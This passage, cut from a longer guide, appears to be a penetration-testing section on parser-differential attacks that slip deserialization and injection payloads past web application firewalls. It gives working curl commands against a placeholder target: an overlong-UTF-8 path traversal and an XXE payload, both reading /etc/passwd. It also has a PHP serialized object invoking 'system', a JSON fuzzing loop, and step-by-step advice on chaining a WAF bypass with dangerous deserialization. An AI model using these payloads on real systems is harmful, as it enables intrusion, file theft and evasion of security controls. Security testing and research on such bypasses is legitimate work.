# Overlong encoding of '/' — some parsers normalize, others reject
payload = b'{\"path\": \"\\xc0\\xaf..\\xc0\\xafetc\\xc0\\xafpasswd\"}'
sys.stdout.buffer.write(payload)
" | curl -sk "https://TARGET/api/endpoint" \
    -H "Content-Type: application/json" \
    --data-binary @-

# Scenario 2: Content-Type mismatch
# Send XML body with JSON content-type (or vice versa)
# WAF inspects based on content-type, backend parses based on content
curl -sk "https://TARGET/api/endpoint" \
  -H "Content-Type: application/json" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Scenario 3: Serialization format confusion
# PHP serialized data with ambiguous type markers
# Different PHP versions handle edge cases in unserialize() differently
# Example: property count mismatch (CVE-2016-7124 variant)
# O:4:"Test":99:{s:1:"x";s:6:"system";} — excess count tricks older parsers

# Scenario 4: Java serialized stream manipulation
# Insert garbage bytes between valid serialization markers
# Some filters scan linearly; ObjectInputStream skips to next valid marker
# The gap between what the filter sees and what Java deserializes is exploitable
```

### 13d — Testing Methodology

```bash
# Step 1: Identify the parsing chain
# Determine what components touch the data before it reaches deserialization:
# - Reverse proxy (nginx, Apache, HAProxy)
# - WAF (ModSecurity, AWS WAF, Cloudflare)
# - API gateway (Kong, Apigee)
# - Application framework (Spring, Django, Express)
# - Serialization library (Jackson, Gson, Newtonsoft)

# Step 2: Test each parser boundary with edge cases
# For each pair of adjacent parsers, find inputs where they disagree

# JSON edge cases to test:
EDGE_CASES=(
  '{"a":1,"a":2}'                          # Duplicate keys
  '{"a":1e999}'                            # Number overflow
  '{"a":"\x00"}'                           # Null byte in string
  '{"a":"\ud83d"}'                         # Lone surrogate
  '/*comment*/{"a":1}'                     # Leading comment
  '{"a":1,}'                               # Trailing comma
  '{"a":NaN}'                              # NaN value
  '{"a":undefined}'                        # Undefined value
)

for case in "${EDGE_CASES[@]}"; do
  echo "Testing: $case"
  curl -sk "https://TARGET/api/endpoint" \
    -H "Content-Type: application/json" \
    -d "$case" \
    -o /dev/null -w "%{http_code}\n"
done

# Step 3: If a WAF is present, find inputs it parses differently
# from the backend — this is the bypass vector

# Step 4: Chain parser differential with deserialization payload
# If the WAF sees "safe" JSON but the backend deserializes a dangerous type,
# you have bypassed the security control
```

### 13e — Real-World Examples

```
# Parser differential patterns seen in the wild:

# 1. JSON key normalization
#    WAF strips unicode escapes: "\u0024type" -> "$type"
#    Backend keeps it as-is: "\u0024type" is a different key
#    Result: WAF misses $type check

# 2. XML namespace confusion
#    WAF checks for <script> in default namespace
#    Attacker uses namespace prefix: <x:script xmlns:x="...">
#    Backend resolves namespace and executes

# 3. Protobuf vs JSON
#    API accepts both protobuf and JSON
#    WAF only inspects JSON
#    Send malicious payload as protobuf to bypass WAF

# 4. Multipart boundary manipulation
#    Different parsers handle boundary strings differently
#    Attacker crafts ambiguous multipart that WAF and backend
#    split into different parts

# 5. HTTP/2 header smuggling
#    Deserialized data arrives via headers that HTTP/2 and HTTP/1.1
#    parse differently at the proxy boundary
```
